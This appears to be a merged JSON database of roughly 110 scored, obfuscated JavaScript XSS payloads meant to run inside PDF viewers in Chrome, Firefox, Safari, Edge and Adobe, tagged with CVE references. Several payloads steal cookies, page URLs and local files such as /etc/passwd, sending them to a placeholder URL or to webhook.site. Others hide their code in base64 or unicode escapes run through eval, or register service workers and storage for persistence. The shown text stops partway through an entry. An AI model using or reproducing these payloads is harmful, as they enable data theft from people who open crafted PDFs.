{
  "metadata": {
    "generated_at": "20250730_143801",
    "generator_version": "3.0",
    "merge_tool": "merge_json_payloads.py",
    "total_payloads": 110,
    "average_quality_score": 45.5,
    "high_quality_payloads": 33,
    "source_files": [
      "chrome.json",
      "adobe.json",
      "firefox.json",
      "pdf_payloads_enhanced_20250730_143526.json",
      "advanced_payloads.json",
      "payload_database_backup.json",
      "edge.json",
      "safari.json"
    ],
    "file_statistics": {
      "chrome.json": {
        "total": 57,
        "valid": 31,
        "duplicates": 0,
        "invalid": 26
      },
      "adobe.json": {
        "total": 15,
        "valid": 15,
        "duplicates": 0,
        "invalid": 0
      },
      "firefox.json": {
        "total": 18,
        "valid": 16,
        "duplicates": 1,
        "invalid": 1
      },
      "pdf_payloads_enhanced_20250730_143526.json": {
        "total": 85,
        "valid": 23,
        "duplicates": 62,
        "invalid": 0
      },
      "advanced_payloads.json": {
        "total": 25,
        "valid": 25,
        "duplicates": 0,
        "invalid": 0
      },
      "payload_database_backup.json": {
        "total": 45,
        "valid": 0,
        "duplicates": 18,
        "invalid": 27
      },
      "edge.json": {
        "total": 12,
        "valid": 0,
        "duplicates": 12,
        "invalid": 0
      },
      "safari.json": {
        "total": 12,
        "valid": 0,
        "duplicates": 12,
        "invalid": 0
      }
    },
    "breakdown": {
      "browsers": {
        "firefox": 23,
        "chrome": 38,
        "safari": 16,
        "edge": 16,
        "adobe": 17
      },
      "categories": {
        "dom_manipulation": 1,
        "webassembly_exploitation": 1,
        "webgl_exploitation": 1,
        "dom_access": 33,
        "persistence": 1,
        "event_driven": 1,
        "broadcast_channel": 1,
        "web_locks_api": 1,
        "file_system": 15,
        "cross_frame_communication": 1,
        "service_worker_abuse": 1,
        "intersection_observer": 1,
        "steganography": 1,
        "machine_learning_evasion": 1,
        "network_exfiltration": 6,
        "timing_attack": 1,
        "polyglot": 1,
        "shared_array_buffer": 1,
        "mutation_observer": 1,
        "credential_management": 1,
        "performance_timeline": 1,
        "csp_bypass": 4,
        "sandbox_escape": 4,
        "command_execution": 3,
        "anti_forensics": 1,
        "indexeddb_exploitation": 1,
        "payment_request_api": 1,
        "webkit_specific": 4,
        "privilege_escalation": 1,
        "api_abuse": 7,
        "webview_exploit": 2,
        "windows_integration": 7,
        "registry_manipulation": 1,
        "macos_integration": 2
      },
      "risk_levels": {
        "high": 55,
        "critical": 19,
        "medium": 31,
        "low": 5
      },
      "detected_techniques": {
        "dom_manipulation": 25,
        "postmessage_abuse": 11,
        "network_exfiltration": 33,
        "pdf_specific": 31,
        "dynamic_execution": 26,
        "file_access": 10
      }
    },
    "quality_distribution": {
      "excellent": 22,
      "good": 25,
      "fair": 17,
      "poor": 46
    }
  },
  "payloads": [
    {
      "id": "advanced_xss_002",
      "category": "dom_manipulation",
      "browser": "firefox",
      "technique": "firefox_csp_bypass_advanced",
      "payload": "(function(){var t=this||window||globalThis;try{if(t.parent&&t.parent.postMessage){var d={type:'xss_payload',browser:'firefox',payload:'pdf_executed',timestamp:Date.now(),url:document.URL,cookies:document.cookie||'none'};t.parent.postMessage(JSON.stringify(d),'{url}');}else if(t.top&&t.top.location){t.top.location.href='{url}?firefox_dom='+btoa(navigator.userAgent+'|'+document.referrer);}}catch(e){try{var x=new XMLHttpRequest();x.open('GET','{url}?firefox_xhr='+encodeURIComponent(e.toString())+'&ua='+encodeURIComponent(navigator.userAgent),true);x.send();}catch(e2){app.alert('Firefox CSP bypass failed: '+e2);}}})();",
      "description": "Firefox PDF.js CSP bypass using postMessage and XMLHttpRequest with JSON data exfiltration",
      "risk_level": "high",
      "cve_reference": "CVE-2019-11707, CVE-2021-23961, CVE-2022-28281",
      "detected_techniques": [
        "dom_manipulation",
        "postmessage_abuse",
        "network_exfiltration",
        "pdf_specific"
      ],
      "quality_score": 95,
      "payload_length": 622,
      "last_updated": "2025-07-30T14:38:01.949024"
    },
    {
      "id": "advanced_xss_014",
      "category": "webassembly_exploitation",
      "browser": "firefox",
      "technique": "firefox_wasm_exploitation",
      "payload": "(function(){try{if(typeof WebAssembly!=='undefined'){var wasmCode=new Uint8Array([0,97,115,109,1,0,0,0,1,7,1,96,0,1,127,3,2,1,0,7,7,1,3,114,117,110,0,0,10,9,1,7,0,65,42,11]);var wasmModule=new WebAssembly.Module(wasmCode);var wasmInstance=new WebAssembly.Instance(wasmModule);var result=wasmInstance.exports.run();var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({browser:'firefox',type:'wasm_exploitation',result:result,timestamp:Date.now()}));}else{throw new Error('WebAssembly not supported');}}catch(e){try{eval(atob('dHJ5e25hdmlnYXRvci5zZW5kQmVhY29uKCd7dXJsfT9maXJlZm94X3dhc21fZmFpbGVkPScgKyBlbmNvZGVVUklDb21wb25lbnQoZS50b1N0cmluZygpKSk7fWNhdGNoKGUyKXthcHAuYWxlcnQoJ0ZpcmVmb3ggV2ViQXNzZW1ibHkgZXhwbG9pdGF0aW9uIGZhaWxlZDogJyArIGUyKTt9'));}catch(e2){app.alert('Firefox WebAssembly exploitation failed: '+e2);}}}());",
      "description": "Firefox WebAssembly exploitation with binary payload execution",
      "risk_level": "critical",
      "cve_reference": "CVE-2019-11707, CVE-2021-23961, CVE-2022-28281",
      "detected_techniques": [
        "network_exfiltration",
        "dynamic_execution",
        "pdf_specific"
      ],
      "quality_score": 95,
      "payload_length": 900,
      "last_updated": "2025-07-30T14:38:01.949301"
    },
    {
      "id": "advanced_xss_021",
      "category": "webgl_exploitation",
      "browser": "firefox",
      "technique": "firefox_webgl_exploitation",
      "payload": "(function(){try{var canvas=document.createElement('canvas');var gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl');if(!gl){throw new Error('WebGL not supported');}var info=gl.getExtension('WEBGL_debug_renderer_info');var vendor=gl.getParameter(info.UNMASKED_VENDOR_WEBGL);var renderer=gl.getParameter(info.UNMASKED_RENDERER_WEBGL);var version=gl.getParameter(gl.VERSION);var data={browser:'firefox',type:'webgl_exploitation',vendor:vendor,renderer:renderer,version:version,timestamp:Date.now()};var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify(data));}catch(e){try{eval(atob('dHJ5e25hdmlnYXRvci5zZW5kQmVhY29uKCd7dXJsfT9maXJlZm94X3dlYmdsX2ZhaWxlZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGUudG9TdHJpbmcoKSkpO31jYXRjaChlMil7YXBwLmFsZXJ0KCdGaXJlZm94IFdlYkdMIGV4cGxvaXRhdGlvbiBmYWlsZWQ6ICcgKyBlMik7fQ=='));}catch(e2){app.alert('Firefox WebGL exploitation failed: '+e2);}}}());",
      "description": "Firefox WebGL exploitation for GPU information disclosure and rendering context abuse",
      "risk_level": "medium",
      "cve_reference": "CVE-2019-11707, CVE-2021-23961, CVE-2022-28281",
      "detected_techniques": [
        "network_exfiltration",
        "dynamic_execution",
        "pdf_specific"
      ],
      "quality_score": 95,
      "payload_length": 964,
      "last_updated": "2025-07-30T14:38:01.949510"
    },
    {
      "id": "xss_pdf_0001",
      "category": "dom_access",
      "browser": "chrome",
      "technique": "dom_manipulation_chrome_1_1",
      "payload": "(function(){ try { var decoded = atob('dHJ5IHsgcGFyZW50LndpbmRvdy5sb2NhdGlvbiA9ICdodHRwczovL3dlYmhvb2suc2l0ZS90ZXN0JzsgfSBjYXRjaChlKSB7IGFwcC5hbGVydCgnQ2hyb21lIGJsb2NrZWQ6ICcgKyBlKTsgfQ=='); (new Function(decoded))(); } catch(e) { try { parent.window.location = 'https://webhook.site/test'; } catch(e) { app.alert('Chrome blocked: ' + e); } } })();",
      "description": "Chrome PDFium DOM access via try { parent.window.location =... (obf: base64)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
      "detected_techniques": [
        "dom_manipulation",
        "dynamic_execution",
        "pdf_specific"
      ],
      "quality_score": 90,
      "payload_length": 348,
      "last_updated": "2025-07-30T14:38:01.946624"
    },
    {
      "id": "xss_pdf_0004",
      "category": "dom_access",
      "browser": "chrome",
      "technique": "dom_manipulation_chrome_2_1",
      "payload": "(function(){ try { var decoded = atob('dHJ5IHsgdG9wLmRvY3VtZW50LmJvZHkuaW5uZXJIVE1MID0gJzxoMT5DaHJvbWUgUERGaXVtIERPTSBYU1M8L2gxPjxzY3JpcHQ+bG9jYXRpb249Imh0dHBzOi8vd2ViaG9vay5zaXRlL3Rlc3QiPC9zY3JpcHQ+JzsgfSBjYXRjaChlKSB7IH0='); (new Function(decoded))(); } catch(e) { try { top.document.body.innerHTML = '<h1>Chrome PDFium DOM XSS</h1><script>location=\"https://webhook.site/test\"</script>'; } catch(e) { } } })();",
      "description": "Chrome PDFium DOM access via try { top.document.body.innerH... (obf: base64)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
      "detected_techniques": [
        "dom_manipulation",
        "dynamic_execution"
      ],
      "quality_score": 90,
      "payload_length": 412,
      "last_updated": "2025-07-30T14:38:01.946719"
    },
    {
      "id": "xss_pdf_0001",
      "category": "dom_access",
      "browser": "chrome",
      "technique": "dom_manipulation_chrome_1_1",
      "payload": "(function(){ try { var decoded = atob('dHJ5IHsgcGFyZW50LndpbmRvdy5sb2NhdGlvbiA9ICdodHRwOi8vdGVzdC5jb20nOyB9IGNhdGNoKGUpIHsgYXBwLmFsZXJ0KCdDaHJvbWUgYmxvY2tlZDogJyArIGUpOyB9'); (new Function(decoded))(); } catch(e) { try { parent.window.location = 'http://test.com'; } catch(e) { app.alert('Chrome blocked: ' + e); } } })();",
      "description": "Chrome PDFium DOM access via try { parent.window.location =... (obf: base64)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
      "detected_techniques": [
        "dom_manipulation",
        "dynamic_execution",
        "pdf_specific"
      ],
      "quality_score": 90,
      "payload_length": 322,
      "last_updated": "2025-07-30T14:38:01.946821"
    },
    {
      "id": "xss_pdf_0001",
      "category": "dom_access",
      "browser": "chrome",
      "technique": "dom_manipulation_chrome_1_1",
      "payload": "(function(){ try { var decoded = atob('dHJ5IHsgaWYodHlwZW9mIHBhcmVudCAhPT0gJ3VuZGVmaW5lZCcgJiYgcGFyZW50LndpbmRvdykgcGFyZW50LndpbmRvdy5sb2NhdGlvbiA9ICdodHRwOi8vdGVzdC1zZXJ2ZXIuY29tJzsgfSBjYXRjaChlKSB7IGFwcC5hbGVydCgnQ2hyb21lIGJsb2NrZWQ6ICcgKyBlKTsgfQ=='); (new Function(decoded))(); } catch(e) { try { if(typeof parent !== 'undefined' && parent.window) parent.window.location = 'http://test-server.com'; } catch(e) { app.alert('Chrome blocked: ' + e); } } })();",
      "description": "Chrome PDFium DOM access via try { if(typeof parent !== 'un... (obf: base64)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
      "detected_techniques": [
        "dom_manipulation",
        "dynamic_execution",
        "pdf_specific"
      ],
      "quality_score": 90,
      "payload_length": 460,
      "last_updated": "2025-07-30T14:38:01.947001"
    },
    {
      "id": "xss_pdf_0004",
      "category": "dom_access",
      "browser": "chrome",
      "technique": "dom_manipulation_chrome_2_1",
      "payload": "(function(){ try { var decoded = atob('dHJ5IHsgaWYodHlwZW9mIHRvcCAhPT0gJ3VuZGVmaW5lZCcgJiYgdG9wLmRvY3VtZW50KSB0b3AuZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAnPGgxPkNocm9tZSBQREZpdW0gRE9NIFhTUzwvaDE+PHNjcmlwdD5sb2NhdGlvbj0iaHR0cDovL3Rlc3Qtc2VydmVyLmNvbSI8L3NjcmlwdD4nOyB9IGNhdGNoKGUpIHsgfQ=='); (new Function(decoded))(); } catch(e) { try { if(typeof top !== 'undefined' && top.document) top.document.body.innerHTML = '<h1>Chrome PDFium DOM XSS</h1><script>location=\"http://test-server.com\"</script>'; } catch(e) { } } })();",
      "description": "Chrome PDFium DOM access via try { if(typeof top !== 'undef... (obf: base64)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
      "detected_techniques": [
        "dom_manipulation",
        "dynamic_execution"
      ],
      "quality_score": 90,
      "payload_length": 516,
      "last_updated": "2025-07-30T14:38:01.947039"
    },
    {
      "id": "xss_pdf_0001",
      "category": "dom_access",
      "browser": "chrome",
      "technique": "dom_manipulation_chrome_1_1",
      "payload": "(function(){ try { var decoded = atob('dHJ5IHsgaWYodHlwZW9mIHBhcmVudCAhPT0gJ3VuZGVmaW5lZCcgJiYgcGFyZW50LndpbmRvdykgcGFyZW50LndpbmRvdy5sb2NhdGlvbiA9ICdodHRwOi8vdGVzdC5jb20nOyB9IGNhdGNoKGUpIHsgYXBwLmFsZXJ0KCdDaHJvbWUgYmxvY2tlZDogJyArIGUpOyB9'); (new Function(decoded))(); } catch(e) { try { if(typeof parent !== 'undefined' && parent.window) parent.window.location = 'http://test.com'; } catch(e) { app.alert('Chrome blocked: ' + e); } } })();",
      "description": "Chrome PDFium DOM access via try { if(typeof parent !== 'un... (obf: base64)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
      "detected_techniques": [
        "dom_manipulation",
        "dynamic_execution",
        "pdf_specific"
      ],
      "quality_score": 90,
      "payload_length": 441,
      "last_updated": "2025-07-30T14:38:01.947069"
    },
    {
      "id": "xss_pdf_0004",
      "category": "dom_access",
      "browser": "chrome",
      "technique": "dom_manipulation_chrome_2_1",
      "payload": "(function(){ try { var decoded = atob('dHJ5IHsgaWYodHlwZW9mIHRvcCAhPT0gJ3VuZGVmaW5lZCcgJiYgdG9wLmRvY3VtZW50KSB0b3AuZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAnPGgxPkNocm9tZSBQREZpdW0gRE9NIFhTUzwvaDE+PHNjcmlwdD5sb2NhdGlvbj0iaHR0cDovL3Rlc3QuY29tIjwvc2NyaXB0Pic7IH0gY2F0Y2goZSkgeyB9'); (new Function(decoded))(); } catch(e) { try { if(typeof top !== 'undefined' && top.document) top.document.body.innerHTML = '<h1>Chrome PDFium DOM XSS</h1><script>location=\"http://test.com\"</script>'; } catch(e) { } } })();",
      "description": "Chrome PDFium DOM access via try { if(typeof top !== 'undef... (obf: base64)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
      "detected_techniques": [
        "dom_manipulation",
        "dynamic_execution"
      ],
      "quality_score": 90,
      "payload_length": 497,
      "last_updated": "2025-07-30T14:38:01.947103"
    },
    {
      "id": "xss_pdf_0001",
      "category": "dom_access",
      "browser": "firefox",
      "technique": "csp_bypass_firefox_1_1",
      "payload": "(function(){ try { var decoded = atob('dHJ5IHsgaWYodHlwZW9mIHBhcmVudCAhPT0gJ3VuZGVmaW5lZCcpIGV2YWwoJ3BhcmVudC5sb2NhdGlvbiA9ICJodHRwOi8vdGVzdC5jb20iJyk7IH0gY2F0Y2goZSkgeyBjb25zb2xlLmxvZygnRmlyZWZveCBDU1AgYmxvY2tlZDonLCBlKTsgfQ=='); (new Function(decoded))(); } catch(e) { try { if(typeof parent !== 'undefined') eval('parent.location = \"http://test.com\"'); } catch(e) { console.log('Firefox CSP blocked:', e); } } })();",
      "description": "Firefox PDF.js CSP bypass via try { if(typeof parent !== 'un... (obf: base64)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-11707, CVE-2021-23961, CVE-2022-28281",
      "detected_techniques": [
        "dom_manipulation",
        "dynamic_execution"
      ],
      "quality_score": 90,
      "payload_length": 418,
      "last_updated": "2025-07-30T14:38:01.947648"
    },
    {
      "id": "advanced_xss_006",
      "category": "persistence",
      "browser": "chrome",
      "technique": "chrome_storage_persistence",
      "payload": "(function(){try{var key='pdf_xss_persist';var payload='{url}?persistent=true&t='+Date.now();if(typeof localStorage!=='undefined'){localStorage.setItem(key,payload);}if(typeof sessionStorage!=='undefined'){sessionStorage.setItem(key,payload);}if(window.parent&&window.parent.localStorage){window.parent.localStorage.setItem(key,payload);}var img=new Image();img.src='{url}?chrome_persist=success&storage='+(localStorage?'1':'0');setTimeout(function(){if(localStorage&&localStorage.getItem(key)){var x=new XMLHttpRequest();x.open('GET',localStorage.getItem(key)+'&verified=true',true);x.send();}},1000);}catch(e){app.alert('Chrome persistence failed: '+e);}}());",
      "description": "Chrome persistent XSS using localStorage and sessionStorage with verification",
      "risk_level": "high",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418",
      "detected_techniques": [
        "dom_manipulation",
        "network_exfiltration",
        "pdf_specific"
      ],
      "quality_score": 90,
      "payload_length": 660,
      "last_updated": "2025-07-30T14:38:01.949111"
    },
    {
      "id": "advanced_xss_010",
      "category": "event_driven",
      "browser": "firefox",
      "technique": "firefox_event_driven_execution",
      "payload": "(function(){var events=['click','mouseover','focus','load','error'];var eventFired=false;function executePayload(){if(eventFired)return;eventFired=true;try{var data={browser:'firefox',event:'triggered',timestamp:Date.now(),url:location.href};if(window.parent&&window.parent.postMessage){window.parent.postMessage(JSON.stringify(data),'{url}');}else{var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify(data));}}catch(e){app.alert('Firefox event-driven execution failed: '+e);}}for(var i=0;i<events.length;i++){document.addEventListener(events[i],executePayload,true);}setTimeout(executePayload,2000);})();",
      "description": "Firefox event-driven execution with multiple trigger mechanisms",
      "risk_level": "medium",
      "cve_reference": "CVE-2019-11707, CVE-2021-23961",
      "detected_techniques": [
        "dom_manipulation",
        "postmessage_abuse",
        "network_exfiltration",
        "pdf_specific"
      ],
      "quality_score": 90,
      "payload_length": 683,
      "last_updated": "2025-07-30T14:38:01.949202"
    },
    {
      "id": "advanced_xss_017",
      "category": "broadcast_channel",
      "browser": "firefox",
      "technique": "firefox_broadcast_channel",
      "payload": "(function(){try{if(typeof BroadcastChannel!=='undefined'){var bc=new BroadcastChannel('xss_channel');bc.onmessage=function(e){try{var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({browser:'firefox',type:'broadcast_channel_response',data:e.data,timestamp:Date.now()}));}catch(err){}};bc.postMessage({type:'xss_broadcast',browser:'firefox',payload:'broadcast_channel_executed',timestamp:Date.now()});setTimeout(function(){bc.close();},5000);}else{throw new Error('BroadcastChannel not supported');}}catch(e){try{parent.postMessage(JSON.stringify({browser:'firefox',type:'broadcast_channel_failed',error:e.toString()}),'{url}');}catch(e2){app.alert('Firefox BroadcastChannel exploitation failed: '+e2);}}}());",
      "description": "Firefox BroadcastChannel exploitation for cross-tab communication",
      "risk_level": "medium",
      "cve_reference": "CVE-2019-11707, CVE-2021-23961",
      "detected_techniques": [
        "dom_manipulation",
        "postmessage_abuse",
        "network_exfiltration",
        "pdf_specific"
      ],
      "quality_score": 90,
      "payload_length": 788,
      "last_updated": "2025-07-30T14:38:01.949387"
    },
    {
      "id": "advanced_xss_025",
      "category": "web_locks_api",
      "browser": "firefox",
      "technique": "firefox_web_locks_api",
      "payload": "(function(){try{if(typeof navigator.locks!=='undefined'){navigator.locks.request('xss_lock',function(lock){var data={browser:'firefox',type:'web_locks_api',lockName:lock.name,timestamp:Date.now()};var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify(data));return new Promise(function(resolve){setTimeout(resolve,1000);});}).catch(function(e){throw e;});}else{throw new Error('Web Locks API not supported');}}catch(e){try{parent.postMessage(JSON.stringify({browser:'firefox',type:'web_locks_failed',error:e.toString()}),'{url}');}catch(e2){app.alert('Firefox Web Locks API exploitation failed: '+e2);}}}());",
      "description": "Firefox Web Locks API exploitation for resource locking and coordination abuse",
      "risk_level": "low",
      "cve_reference": "CVE-2019-11707, CVE-2021-23961",
      "detected_techniques": [
        "dom_manipulation",
        "postmessage_abuse",
        "network_exfiltration",
        "pdf_specific"
      ],
      "quality_score": 90,
      "payload_length": 685,
      "last_updated": "2025-07-30T14:38:01.949622"
    },
    {
      "id": "xss_pdf_0007",
      "category": "dom_access",
      "browser": "chrome",
      "technique": "dom_manipulation_chrome_3_1",
      "payload": "(function(){ try { var decoded = atob('dHJ5IHsgd2luZG93Lm9wZW5lci5ldmFsKCdhbGVydCgiQ2hyb21lIFhTUyB2aWEgb3BlbmVyIik7IGxvY2F0aW9uPSJodHRwczovL3dlYmhvb2suc2l0ZS90ZXN0IicpOyB9IGNhdGNoKGUpIHsgfQ=='); (new Function(decoded))(); } catch(e) { try { window.opener.eval('alert(\"Chrome XSS via opener\"); location=\"https://webhook.site/test\"'); } catch(e) { } } })();",
      "description": "Chrome PDFium DOM access via try { window.opener.eval('aler... (obf: base64)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
      "detected_techniques": [
        "dynamic_execution"
      ],
      "quality_score": 80,
      "payload_length": 355,
      "last_updated": "2025-07-30T14:38:01.946767"
    },
    {
      "id": "xss_pdf_0010",
      "category": "dom_access",
      "browser": "chrome",
      "technique": "dom_manipulation_chrome_4_1",
      "payload": "(function(){ try { var decoded = atob('dHJ5IHsgZnJhbWVzWzBdLmxvY2F0aW9uID0gJ2h0dHBzOi8vd2ViaG9vay5zaXRlL3Rlc3QnOyB9IGNhdGNoKGUpIHsgYXBwLmxhdW5jaFVSTCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvdGVzdCcpOyB9'); (new Function(decoded))(); } catch(e) { try { frames[0].location = 'https://webhook.site/test'; } catch(e) { app.launchURL('https://webhook.site/test'); } } })();",
      "description": "Chrome PDFium DOM access via try { frames[0].location = '{u... (obf: base64)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
      "detected_techniques": [
        "dynamic_execution"
      ],
      "quality_score": 80,
      "payload_length": 357,
      "last_updated": "2025-07-30T14:38:01.946802"
    },
    {
      "id": "xss_pdf_0002",
      "category": "dom_access",
      "browser": "firefox",
      "technique": "csp_bypass_firefox_1_2",
      "payload": "try { if(typeof parent !== 'undefined') eval('parent.location = \"http://test.com\"'); } catch(e) { console.log('Firefox CSP blocked:', e); }",
      "description": "Firefox PDF.js CSP bypass via try { if(typeof parent !== 'un... (obf: eval_alternatives)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-11707, CVE-2021-23961, CVE-2022-28281",
      "detected_techniques": [
        "dom_manipulation",
        "dynamic_execution"
      ],
      "quality_score": 80,
      "payload_length": 139,
      "last_updated": "2025-07-30T14:38:01.947684"
    },
    {
      "id": "advanced_xss_003",
      "category": "file_system",
      "browser": "safari",
      "technique": "safari_webkit_file_access",
      "payload": "(function(){var fs=['{sensitive_file}','file:///etc/passwd','file:///System/Library/CoreServices/SystemVersion.plist'];try{for(var i=0;i<fs.length;i++){try{var f=new XMLHttpRequest();f.open('GET',fs[i],false);f.send();if(f.responseText){var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({file:fs[i],content:btoa(f.responseText),browser:'safari'}));break;}}catch(e){continue;}}}catch(e){try{window.open('{directory}','_blank');}catch(e2){app.alert('Safari file access blocked: '+e2);}}})();",
      "description": "Safari PDFKit file system access with content exfiltration via XHR POST",
      "risk_level": "critical",
      "cve_reference": "CVE-2019-8625, CVE-2020-3899, CVE-2021-30661",
      "detected_techniques": [
        "network_exfiltration",
        "file_access",
        "pdf_specific"
      ],
      "quality_score": 80,
      "payload_length": 570,
      "last_updated": "2025-07-30T14:38:01.949047"
    },
    {
      "id": "advanced_xss_013",
      "category": "cross_frame_communication",
      "browser": "chrome",
      "technique": "chrome_cross_frame_communication",
      "payload": "(function(){try{var frames=[];try{frames.push(parent);}catch(e){}try{frames.push(top);}catch(e){}try{for(var i=0;i<10;i++){frames.push(window.frames[i]);}}catch(e){}for(var f=0;f<frames.length;f++){try{if(frames[f]&&frames[f].postMessage){var message={type:'xss_communication',browser:'chrome',frameIndex:f,timestamp:Date.now(),payload:'cross_frame_executed'};frames[f].postMessage(JSON.stringify(message),'{url}');}}catch(e){continue;}}var channel=new MessageChannel();channel.port1.onmessage=function(e){try{var response=new XMLHttpRequest();response.open('POST','{url}',true);response.send('chrome_cross_frame_response='+encodeURIComponent(e.data));}catch(err){}};try{parent.postMessage('chrome_channel_init','{url}',[channel.port2]);}catch(e){}}catch(e){app.alert('Chrome cross-frame communication failed: '+e);}}());",
      "description": "Chrome cross-frame communication using MessageChannel and postMessage vectors",
      "risk_level": "high",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
      "detected_techniques": [
        "dom_manipulation",
        "postmessage_abuse",
        "network_exfiltration",
        "pdf_specific"
      ],
      "quality_score": 80,
      "payload_length": 821,
      "last_updated": "2025-07-30T14:38:01.949274"
    },
    {
      "id": "advanced_xss_015",
      "category": "service_worker_abuse",
      "browser": "safari",
      "technique": "safari_service_worker_abuse",
      "payload": "(function(){try{if('serviceWorker' in navigator){var swCode='self.addEventListener(\"fetch\",function(e){if(e.request.url.includes(\"evil\")){e.respondWith(fetch(\"{url}?safari_sw_intercept=\"+encodeURIComponent(e.request.url)));}});';var blob=new Blob([swCode],{type:'application/javascript'});var swUrl=URL.createObjectURL(blob);navigator.serviceWorker.register(swUrl).then(function(reg){var x=new XMLHttpRequest();x.open('GET','{url}?safari_sw_registered=true&scope='+encodeURIComponent(reg.scope),true);x.send();}).catch(function(e){throw e;});}else{throw new Error('Service Workers not supported');}}catch(e){try{var fallback=new XMLHttpRequest();fallback.open('POST','{url}',true);fallback.setRequestHeader('Content-Type','application/json');fallback.send(JSON.stringify({browser:'safari',type:'service_worker_abuse_failed',error:e.toString(),timestamp:Date.now()}));}catch(e2){app.alert('Safari Service Worker abuse failed: '+e2);}}}());",
      "description": "Safari Service Worker abuse for request interception and manipulation",
      "risk_level": "high",
      "cve_reference": "CVE-2019-8625, CVE-2020-3899, CVE-2021-30661",
      "detected_techniques": [
        "network_exfiltration",
        "pdf_specific"
      ],
      "quality_score": 80,
      "payload_length": 938,
      "last_updated": "2025-07-30T14:38:01.949332"
    },
    {
      "id": "advanced_xss_018",
      "category": "intersection_observer",
      "browser": "edge",
      "technique": "edge_intersection_observer",
      "payload": "(function(){try{if(typeof IntersectionObserver!=='undefined'){var target=document.createElement('div');target.style.position='absolute';target.style.top='0px';target.style.left='0px';target.style.width='1px';target.style.height='1px';document.body.appendChild(target);var observer=new IntersectionObserver(function(entries){entries.forEach(function(entry){if(entry.isIntersecting){var x=new XMLHttpRequest();x.open('GET','{url}?edge_intersection_observer=triggered&time='+Date.now(),true);x.send();observer.disconnect();}});},{threshold:0});observer.observe(target);}else{throw new Error('IntersectionObserver not supported');}}catch(e){try{window.open('{url}?edge_intersection_failed='+encodeURIComponent(e.toString()),'_blank');}catch(e2){app.alert('Edge IntersectionObserver exploitation failed: '+e2);}}}());",
      "description": "Microsoft Edge IntersectionObserver exploitation for visibility-based triggering",
      "risk_level": "low",
      "cve_reference": "CVE-2020-0674, CVE-2021-26411",
      "detected_techniques": [
        "dom_manipulation",
        "network_exfiltration",
        "pdf_specific"
      ],
      "quality_score": 80,
      "payload_length": 812,
      "last_updated": "2025-07-30T14:38:01.949414"
    },
    {
      "id": "advanced_xss_007",
      "category": "steganography",
      "browser": "firefox",
      "technique": "firefox_steganographic_payload",
      "payload": "(function(){var h='\\u0066\\u0075\\u006e\\u0063\\u0074\\u0069\\u006f\\u006e\\u0020\\u0065\\u0078\\u0066\\u0069\\u006c\\u0028\\u0029\\u007b\\u0076\\u0061\\u0072\\u0020\\u0064\\u003d\\u006e\\u0065\\u0077\\u0020\\u0044\\u0061\\u0074\\u0065\\u0028\\u0029\\u002e\\u0074\\u006f\\u0049\\u0053\\u004f\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0028\\u0029\\u003b\\u0076\\u0061\\u0072\\u0020\\u0075\\u003d\\u006e\\u0061\\u0076\\u0069\\u0067\\u0061\\u0074\\u006f\\u0072\\u002e\\u0075\\u0073\\u0065\\u0072\\u0041\\u0067\\u0065\\u006e\\u0074\\u003b\\u0076\\u0061\\u0072\\u0020\\u0078\\u003d\\u006e\\u0065\\u0077\\u0020\\u0058\\u004d\\u004c\\u0048\\u0074\\u0074\\u0070\\u0052\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0028\\u0029\\u003b\\u0078\\u002e\\u006f\\u0070\\u0065\\u006e\\u0028\\u0027\\u0050\\u004f\\u0053\\u0054\\u0027\\u002c\\u0027{url}\\u0027\\u002c\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u0078\\u002e\\u0073\\u0065\\u006e\\u0064\\u0028\\u004a\\u0053\\u004f\\u004e\\u002e\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067\\u0069\\u0066\\u0079\\u0028\\u007b\\u0074\\u0069\\u006d\\u0065\\u003a\\u0064\\u002c\\u0075\\u0061\\u003a\\u0075\\u002c\\u0062\\u0072\\u006f\\u0077\\u0073\\u0065\\u0072\\u003a\\u0027\\u0066\\u0069\\u0072\\u0065\\u0066\\u006f\\u0078\\u0027\\u007d\\u0029\\u0029\\u003b\\u007d';try{eval(h);exfil();}catch(e){var b=atob('dHJ5e25hdmlnYXRvci5zZW5kQmVhY29uKCd7dXJsfT9zdGVnYW5vPWZhaWxlZCcpO31jYXRjaChlMil7YXBwLmFsZXJ0KCdGaXJlZm94IHN0ZWdhbm9ncmFwaGljIGZhaWxlZDogJytlMik7fQ==');eval(b);}}());",
      "description": "Firefox steganographic payload using Unicode escaping and base64 encoding layers",
      "risk_level": "high",
